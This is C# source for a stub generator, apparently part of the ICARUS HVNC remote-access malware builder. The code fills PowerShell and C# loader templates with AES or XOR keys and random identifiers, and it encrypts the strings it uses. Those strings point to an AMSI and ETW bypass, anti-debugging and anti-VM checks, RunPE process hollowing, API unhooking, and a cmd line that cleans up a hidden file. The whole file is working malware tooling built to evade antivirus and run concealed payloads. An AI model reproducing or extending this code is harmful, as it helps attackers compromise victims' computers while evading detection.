using System;
using System.Text;

namespace ICARUS.HVNC.StubUtils
{
    public class StubGen
    {
        public static string CreatePS(byte[] key, byte[] byte_0, EncryptionMode mode, Random rng)
        {
            string newValue = Utils.RandomString(5, rng);
            string newValue2 = Utils.RandomString(5, rng);
            string newValue3 = Utils.RandomString(5, rng);
            string newValue4 = Utils.RandomString(5, rng);
            string newValue5 = Utils.RandomString(5, rng);
            string newValue6 = Utils.RandomString(5, rng);
            string newValue7 = Utils.RandomString(5, rng);
            string newValue8 = Utils.RandomString(5, rng);
            string newValue9 = Utils.RandomString(5, rng);
            string newValue10 = Utils.RandomString(5, rng);
            string newValue11 = Utils.RandomString(5, rng);
            if (mode == EncryptionMode.AES)
            {
                return Utils.GetEmbeddedString("HVNC.Resources.AESStub.ps1").Replace("DECRYPTION_KEY", Convert.ToBase64String(key)).Replace("DECRYPTION_IV", Convert.ToBase64String(byte_0))
                    .Replace("tbsreversed_var", newValue)
                    .Replace("tbs_var", newValue2)
                    .Replace("contents_var", newValue3)
                    .Replace("lastline_var", newValue4)
                    .Replace("payload_var", newValue5)
                    .Replace("aes_var", newValue7)
                    .Replace("decryptor_var", newValue8)
                    .Replace("msi_var", newValue9)
                    .Replace("mso_var", newValue10)
                    .Replace("gs_var", newValue11)
                    .Replace(Environment.NewLine, string.Empty);
            }
            return Utils.GetEmbeddedString("HVNC.Resources.XORStub.ps1").Replace("DECRYPTION_KEY", Convert.ToBase64String(key)).Replace("tbsreversed_var", newValue)
                .Replace("tbs_var", newValue2)
                .Replace("contents_var", newValue3)
                .Replace("lastline_var", newValue4)
                .Replace("payload_var", newValue5)
                .Replace("key_var", newValue6)
                .Replace("msi_var", newValue9)
                .Replace("mso_var", newValue10)
                .Replace("gs_var", newValue11)
                .Replace(Environment.NewLine, string.Empty);
        }

        public static string CreateCS(byte[] key, byte[] byte_0, EncryptionMode mode, bool antidebug, bool antivm, bool native, Random rng)
        {
            string newValue = Utils.RandomString(20, rng);
            string newValue2 = Utils.RandomString(20, rng);
            string newValue3 = Utils.RandomString(20, rng);
            string newValue4 = Utils.RandomString(20, rng);
            string newValue5 = Utils.RandomString(20, rng);
            string newValue6 = Utils.RandomString(20, rng);
            string newValue7 = Utils.RandomString(20, rng);
            string newValue8 = Utils.RandomString(20, rng);
            string newValue9 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("AmsiScanBuffer"), key, byte_0));
            string newValue10 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("EtwEventWrite"), key, byte_0));
            string newValue11 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), key, byte_0));
            string newValue12 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("IsDebuggerPresent"), key, byte_0));
            string newValue13 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("payload.exe"), key, byte_0));
            string newValue14 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("runpe.dll"), key, byte_0));
            string newValue15 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("runpe.RunPE"), key, byte_0));
            string newValue16 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("ExecutePE"), key, byte_0));
            string newValue17 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("apiunhooker.dll"), key, byte_0));
            string newValue18 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("apiunhooker.APIUnhooker"), key, byte_0));
            string newValue19 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("Start"), key, byte_0));
            string newValue20 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("/c choice /c y /n /d y /t 1 & attrib -h \""), key, byte_0));
            string newValue21 = Convert.ToBase64String(key);
            string newValue22 = Convert.ToBase64String(byte_0);
            string text = string.Empty;
            string embeddedString = Utils.GetEmbeddedString("HVNC.Resources.Stub.cs");
            if (antidebug)
            {
                text += "#define ANTI_DEBUG\n";
            }
            if (antivm)
            {
                text += "#define ANTI_VM\n";
            }
            if (native)
            {
                text += "#define USE_RUNPE\n";
            }
            return ((mode != EncryptionMode.XOR) ? (text + "#define AES_ENCRYPT\n") : (text + "#define XOR_ENCRYPT\n")) + embeddedString.Replace("namespace_name", newValue).Replace("class_name", newValue2).Replace("aesfunction_name", newValue3)
                .Replace("uncompressfunction_name", newValue4)
                .Replace("getembeddedresourcefunction_name", newValue5)
                .Replace("virtualprotect_name", newValue6)
                .Replace("checkremotedebugger_name", newValue7)
                .Replace("isdebuggerpresent_name", newValue8)
                .Replace("amsiscanbuffer_str", newValue9)
                .Replace("etweventwrite_str", newValue10)
                .Replace("checkremotedebugger_str", newValue11)
                .Replace("isdebuggerpresent_str", newValue12)
                .Replace("payloadtxt_str", newValue13)
                .Replace("runpedlltxt_str", newValue14)
                .Replace("runpeclass_str", newValue15)
                .Replace("runpefunction_str", newValue16)
                .Replace("unhookertxt_str", newValue17)
                .Replace("unhookerclass_str", newValue18)
                .Replace("unhookerfunction_str", newValue19)
                .Replace("cmdcommand_str", newValue20)
                .Replace("key_str", newValue21)
                .Replace("iv_str", newValue22);
        }
    }
}
